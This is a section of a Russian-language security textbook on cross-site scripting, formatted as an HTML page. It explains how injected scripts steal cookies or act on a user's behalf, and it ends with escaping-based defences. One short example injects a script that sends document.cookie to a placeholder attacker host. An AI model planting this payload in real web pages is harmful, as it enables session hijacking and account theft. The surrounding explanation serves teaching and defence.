<!DOCTYPE html SYSTEM "about:legacy-compat">
<html><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8"><style type="text/css"> 
div.toc-item-h2 {
  padding-left: 2em;
}
div.toc-item-h3 {
  padding-left: 4em;
}
div.toc-item-h4 {
  padding-left: 6em;
}
div.toc-item-h5 {
  padding-left: 8em;
}
div.toc-item-h6 {
  padding-left: 10em;
}
</style><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" rel="stylesheet"><style type="text/css"> 
span.small {
  font-size: 90%
}
span.tiny {
  font-size: 50%
}
</style><style type="text/css"> 
div.mathjax {
  padding-top: .5em;
  padding-bottom: .5em;
}
</style></head><body><div class="container"><h2 data-command-name="section" id="15_5_Межсайтовый_скриптинг">15.5. Межсайтовый скриптинг</h2><p><a name="N112106"><!--атака!XSS--></a>
Другой вид распространённых программных уязвимостей состоит в некорректной обработке данных, введённых пользователем. Типичные примеры: отсутствующее или неправильное экранирование специальных символов и полей (спецсимволы <tt></tt> и <tt></tt> HTML, кавычки, слэши <tt>/</tt>, <tt><command name="textbackslash"></command></tt>) и отсутствующая или неправильная проверка введённых данных на допустимые значения (SQL-запрос к базе данных веб-ресурса вместо логина пользователя).</p><p>Межсайтовый скриптинг (англ. <span lang="en"><i>Cross-Site Scripting, XSS</i></span>) заключается во внедрении в веб-страницу злоумышленником <span class="mathjax">$A$</span> исполняемого текстового скрипта, который будет исполнен браузером клиента <span class="mathjax">$B$</span>. Скрипт может быть написан на языках JavaScript, VBScript, ActiveX, HTML, Flash. Целью атаки является, как правило, доступ к информации клиента.</p><p>Скрипт может получить доступ к cookie-файлам данного сайта, например с аутентификатором, вставить гиперссылки на свой сайт под видом доверенных ссылок. Вставленные гиперссылки могут содержать информацию пользователя.</p><p>Скрипт также может выполнить последовательность HTTP GET- и POST-запросов на веб-сайт для выполнения действий от имени пользователя. Например вирусно распространить вредоносный JavaScript код со страницы одного пользователя на страницы всех друзей, друзей друзей и<span class="nonbreaking-interword-space"> </span>т.&nbsp;д., а затем удалить все данные пользователя. Атака может привести к уничтожению социальной сети.</p><p>Приведём пример кражи cookie-файла веб-сайта, который имеет уязвимость на вставку текста, содержащего исполняемый браузером код.</p><!--%Когда браузер первый раз обращается к сайту, веб-приложение может выслать вместе с HTML страницей cookie-файл, хранящий текстовую строку последовательностей--><p>Пусть аутентификатор пользователя в cookie-строке от сайта <tt>myemail.com</tt> содержит следующие данные:</p><div style="display: flex; align-items: center; justify-content: center;"> <pre>auth=AJHVML43LDSL42SC6DF;</pre> </div><p>Пусть текстовое сообщение, размещённое пользователем, содержит скрипт, помещающий на странице &laquo;изображение&raquo;, расположенное по некоему адресу</p><pre>&lt;script&gt;
  new Image().src = "http://stealcookie.com?c=" +
    encodeURI(document.cookie);
&lt;/script&gt;</pre><p>Тогда браузеры всех пользователей, которым показывается сообщение, при загрузке страницы отправят HTTP GET-запрос на получение файла &laquo;изображения&raquo; по адресу</p><div style="display: flex; align-items: center; justify-content: center;"> <pre>http://stealcookie.com?auth=AJHVML43LDSL42SC6DF;</pre> </div><p>В результате злоумышленник получит cookie, используя который он сможет заходить на веб-сайт под видом пользователя.</p><p>Вставка гиперссылок является наиболее частой XSS-атакой. Иногда ссылки кодируются шестнадцатеричными числами вида <tt></tt>NN, чтобы не вызывать сомнения у пользователя текстом ссылки.</p><!--%Браузер самостоятельно не может отослать данные на другой сайт, отличный от текущего, поэтому передаваемая информация содержится в гиперссылках.--><!--%(например, JavaScript код), либо программным обеспечением, генерирующим HTML-страницу для выдачи клиенту $B$ (например, PHP код). Цель XSS атаки - - либо выполнение JavaScript кода браузером клиента, либо выполнение скриптового кода на веб-сервере при запросе клиента к нему.--><!--%Простой пример - - веб-форум. Пользователи вводят в формы текстовые сообщения, которые запоминаются в БД и показываются другим пользователям. Страница форума генерируется каждый раз заново при запросе пользователей информационной системой. Генерирование часто происходит из шаблона страницы, который содержит и базовый статический HTML код страницы, и исполняемый код скрипта для вставки динамического содержания на основе запроса к базе данных. Как правило, злоумышленник пользуется во время генерирования страницы некорректным экранированием текста, введённого им в формах ввода текста веб-страницы, кавычек, слэшей. То есть, текстовые значения полей, которые сохраняются в базе данных веб-сайта и отображаются другим пользователям, содержат исполняемый код злоумышленника.--><p>На 2009 г. 80 обнаруженных уязвимостей веб-сайтов являются XSS-уязвимостями.</p><p>Стандартный способ защиты от XSS-атак заключается в фильтрации, замене, экранировании символов и слов введённого пользователем текста: <tt></tt>, <tt></tt>, <tt>/</tt>, <tt><command name="textbackslash"></command></tt>, <tt>"</tt>, <tt>'</tt>, <tt>(</tt>, <tt>)</tt>, <tt>script</tt>, <tt>javascript</tt> и<span class="nonbreaking-interword-space"> </span>др., а также в обработке кодировок символов.</p><nav aria-label="Page navigation example"><ul class="pagination justify-content-center"><li class="page-item"><a class="page-link" href="15_4_Perepolnenie_bufera_v_steke.html">&#129080; 15_4_Perepolnenie_bufera_v_steke</a></li><li class="page-item"><a class="page-link" href="15_6_SQL_inektsii.html">15_6_SQL_inektsii &#129082;</a></li></ul></nav></div><script>
window.MathJax = {
  loader: {
    load: ['[tex]/tagformat'],
  },
  options: {
    processHtmlClass: 'mathjax'
  },
  tex: {
    packages: {
      '[+]': ['base', 'ams', 'physics', 'textcomp']
    },
    inlineMath: [['$', '$']],
  },
};
</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="yes" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script></body></html>